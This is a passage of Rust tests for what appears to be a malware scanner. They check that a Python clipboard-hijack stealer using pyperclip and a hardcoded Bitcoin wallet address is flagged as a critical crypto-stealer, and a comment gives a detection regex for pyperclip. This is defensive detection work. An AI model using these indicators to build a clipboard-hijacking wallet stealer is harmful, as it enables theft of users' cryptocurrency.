///   pyperclip\.(?:paste|copy)
/// Or add a new rule SB_PY_PYPERCLIP_HIJACK in script_behavior.rs with:
///   r"(?i)pyperclip\.(paste|copy)\b"
/// as a credential/stealer indicator.
#[test]
// GAP-C fixed: clipboard_hijack regex now includes pyperclip.(?:paste|copy) in both
// forward (pyperclip-then-wallet) and reverse (wallet-then-pyperclip) orders.
fn scenario7_pyperclip_python_clipboard_hijack_flagged() {
    let findings = scan_files_ioc(&[make_py("stealer.py", SCENARIO_7_PYPERCLIP_PY)]);

    // Should detect clipboard hijack pattern for pyperclip.paste()/copy().
    assert!(
        has_rule(&findings, "IOC_CLIPBOARD_HIJACK"),
        "GAP: pyperclip clipboard hijack not detected by IOC_CLIPBOARD_HIJACK"
    );
    assert_eq!(
        findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("IOC_CLIPBOARD_HIJACK"))
            .map(|f| f.severity),
        Some(Severity::Critical),
        "GAP: pyperclip hijack severity must be Critical"
    );
}

#[test]
fn scenario7_clipboardy_wallet_btc_address_ioc_flagged() {
    // Even without the clipboard-hijack combo rule, the hardcoded BTC wallet
    // address must be flagged by IOC_WALLET_BTC (CryptoStealer/High).
    let findings = scan_files_ioc(&[make_py("stealer.py", SCENARIO_7_PYPERCLIP_PY)]);

    assert!(
        has_rule(&findings, "IOC_WALLET_BTC"),
        "SCENARIO 7: BTC wallet address in pyperclip stealer not flagged by IOC_WALLET_BTC; \
         findings: {findings:#?}"
    );
    // Even without clipboard-hijack, the wallet address makes it CryptoStealer.
    assert!(
        has_category(&findings, ThreatCategory::CryptoStealer),
        "SCENARIO 7: no CryptoStealer category in pyperclip stealer findings; \
         findings: {findings:#?}"
    );
}
